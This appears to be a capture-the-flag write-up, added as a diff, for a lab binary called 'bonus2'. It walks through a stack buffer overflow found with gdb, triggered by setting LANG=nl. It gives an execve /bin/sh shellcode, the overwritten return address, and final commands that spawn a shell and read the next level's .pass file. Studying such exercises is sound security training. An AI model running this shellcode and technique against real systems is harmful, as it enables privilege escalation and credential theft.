@@ -1,0 +1,55 @@
+Buffer Overflow
+
+We have a program with a main function and a greetuser function
+Program takes 2 args and prints "Hello <argv[1]>"
+Puting a great argv[1] and argv[2] we have a segfault with the program printing
+"Hello <40 long char argv[1]><32 char long argv[2]>"
+Under gdb :
+
+gdb bonus2
+(gdb) set disassembly-flavor intel
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*100')
+
+A segfault at address 0x08004242, "4242" is our B, but no matter how many B
+we insert program allways try to jump at that address.
+
+Further in the program we realise 3 conditions, if env variable LANG equals to
+"nl", "fi" or none of those
+
+with LANG=nl program will print "Goedemiddag! <argv[1]>"
+with LANG=fi program will print "Hyvää päivää <argv[1]>"
+And else it will print "Hello <argv[1]>"
+
+So we modify LANG to nl under gdb and relauch our test to see what happend
+
+(gdb) set env LANG=nl
+(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*100')
+
+We got a segfault at 0x42424242 !!!!
+
+Now we need to put a shellcode instead of B's and find the address of the begining of it
+(For this case we're using a 21 char long shell code found in internet)
+
+(gdb) r $(python -c 'print "A"*40') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "CCCC"')
+
+To find where our shellcode is we put a breakpoint before strcat knowing that $eax
+will point near our buffer with shellcode and we also replace A with nop (\x90)
+
+(gdb) b *0x0804850d
+(gdb) r $(python -c 'print "\x90"*40') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*2 + "CCCC"')
+(gdb) x/64x $eax
+
+Exploring the memory we finaly find the address 0xbffff688
+
+(gdb) r $(python -c 'print "\x90"*40') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*2 + "\xbf\xff\xf6\x88"[::-1]')
+
+New program /bin/dash beeing executed !
+
+(gdb) quit
+export LANG=nl
+./bonus2 $(python -c 'print "\x90"*40') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*2 + "\xbf\xff\xf6\x88"[::-1]')
+whoami
+cd ../bonus3
+cat .pass
